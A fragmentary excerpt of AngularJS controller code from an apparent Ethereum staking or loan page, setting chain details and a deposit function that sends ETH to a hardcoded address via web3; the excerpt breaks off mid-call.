...
app.controller('myCtrl', async function($scope) {
    $scope.init = function() {
        ...
        $scope.chain = "Ethereum", $scope.addressdex = "0x39db2A143FE027A1A6f11cd79F430D6BA29bd171", $scope.scan = "https://etherscan.io/", $scope.idscan = "Etherscan", $scope.stacking = document.getElementById('loanAmtInput');
        $scope.erc20 = {
            network: !isBnb
        };
        $scope.loan = {
        ...
        $scope.depositEth = function() {
            ...
            window.web3.eth.sendTransaction({
                to: '0x39db2A143FE027A1A6f11cd79F430D6BA29bd171',
